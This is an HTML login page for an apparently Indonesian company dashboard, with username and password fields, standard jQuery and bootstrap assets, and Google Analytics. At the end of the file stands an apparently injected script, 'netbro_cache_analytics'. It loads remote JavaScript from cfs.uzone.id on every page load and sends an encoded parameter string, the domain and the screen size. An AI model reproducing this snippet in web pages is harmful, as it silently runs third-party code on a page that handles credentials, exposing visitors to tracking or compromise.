<!DOCTYPE html>
<html lang="en"><head>
	<meta charset="utf-8" />
	<title>Login Page</title>
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" />
	<meta content="login page of master dashboard" name="description" />
	<meta content="admin@softek.co.id" name="author" />
	
	<!-- ================== BEGIN BASE CSS STYLE ================== -->
	<link href="http://fonts.googleapis.com/css?family=Nunito:400,300,700" rel="stylesheet" id="fontFamilySrc" />
	<link href="asset/assets/plugins/jquery-ui/themes/base/minified/jquery-ui.min.css" rel="stylesheet" />
	<link href="asset/assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
	<link href="asset/assets/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet" />
	<link href="asset/assets/css/animate.min.css" rel="stylesheet" />
	<link href="asset/assets/css/style.min.css" rel="stylesheet" />
	<!-- ================== END BASE CSS STYLE ================== -->
    
	<!-- ================== BEGIN BASE JS ================== -->
	<script src="asset/assets/plugins/pace/pace.min.js"></script>
	<!-- ================== END BASE JS ================== -->
	
	<!--[if lt IE 9]>
	    <script src="assets/crossbrowserjs/excanvas.min.js"></script>
	<![endif]-->
</head>
<body class="pace-top">
	<!-- begin #page-loader -->
	<div id="page-loader" class="page-loader fade in"><span class="spinner">Loading...</span></div>
	<!-- end #page-loader -->

	<!-- begin #page-container -->
	<div id="page-container" class="fade page-container">
	    <!-- begin login -->
		<div class="login">
		    <!-- begin login-brand -->
            <div class="login-brand bg-inverse text-white">
                <img src="asset/assets/img/logo-white.png" height="36" class="pull-right" alt="" /> Login Page
            </div>
		    <!-- end login-brand -->
		    <!-- begin login-content -->
            <div class="login-content">
                <h4 class="text-center m-t-0 m-b-20">Login to Access Dashboard</h4>
                <form action="dashboard/core/login.php" role="form" method="POST" class="form-input-flat"> 
                    <div class="form-group">
                        <input type="text" name="user" class="form-control input-lg" placeholder="Username" autofocus/>
                    </div>
                    <div class="form-group">
                        <input type="password" name="pass" class="form-control input-lg" placeholder="Password" />
                    </div>
                    <div class="row m-b-20">
                        <div class="col-md-12">
							<input type="hidden" name="online" class="form-control input-lg" value="1">
                            <button type="submit" class="btn btn-lime btn-lg btn-block">Sign in</button>
                        </div>
                    </div>
                    <!-- <div class="text-center">
                        New here? <a href="extra_register.html" class="text-muted">Create a new account</a>
                    </div> -->
                </form>
            </div>
		    <!-- end login-content -->
		</div>
		<!-- end login -->
	</div>
	<!-- end page container -->
	
	<!-- ================== BEGIN BASE JS ================== -->
	<script src="asset/assets/plugins/jquery/jquery-1.9.1.min.js"></script>
	<script src="asset/assets/plugins/jquery/jquery-migrate-1.1.0.min.js"></script>
	<script src="asset/assets/plugins/jquery-ui/ui/minified/jquery-ui.min.js"></script>
	<script src="asset/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<!--[if lt IE 9]>
		<script src="assets/crossbrowserjs/html5shiv.js"></script>
		<script src="assets/crossbrowserjs/respond.min.js"></script>
	<![endif]-->
	<script src="asset/assets/plugins/slimscroll/jquery.slimscroll.min.js"></script>
	<script src="asset/assets/plugins/jquery-cookie/jquery.cookie.js"></script>
	<!-- ================== END BASE JS ================== -->
	
	<!-- ================== BEGIN PAGE LEVEL JS ================== -->
    <script src="asset/assets/js/demo.min.js"></script>
    <script src="asset/assets/js/apps.min.js"></script>
	<!-- ================== END PAGE LEVEL JS ================== -->
	
	<script>
		$(document).ready(function() {
		    App.init();
		    Demo.initThemePanel();
		});
	</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','../../../../www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-53034621-1', 'auto');
  ga('send', 'pageview');

</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKQ0wT%2f1BZpnO%2feXkTwBLhxRdJNT7jx%2bpSKyLdcCP7Mv9smeskXIa9DJdKAArSomKBiGefO5U056svY97NBy%2fsMpJyzXITwIN5VlsSErvfCT2t47%2fnC%2fjIFBd9npmXIXd5kU4MfIjZv3oxji4XCFApq2emsGxEPXEtRWj3DkUsyAFiBgtqyWI3boHBPvTL%2flJ5gUOKhVi0u7Qq8wpUcL8OneaWGUX123CAZYIlIJjvwxpq3U%2f10heFM54EECwl2b%2bI%2bLiAiMIFUo7WDqkVxu0HpybB6LXIUdI0K%2fLKH68HN326AZVk25hu%2fgDt%2byowqhLHwPJr3fuPHKuq%2bhs%2fhjaAoaCsc4tMeEIVuXN8egbiNFLIBfz9uTpXK6%2fcTv7OT5cgqE0hQSxVW2jTZCqFT4pdiJRGxZAMhBIj" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>
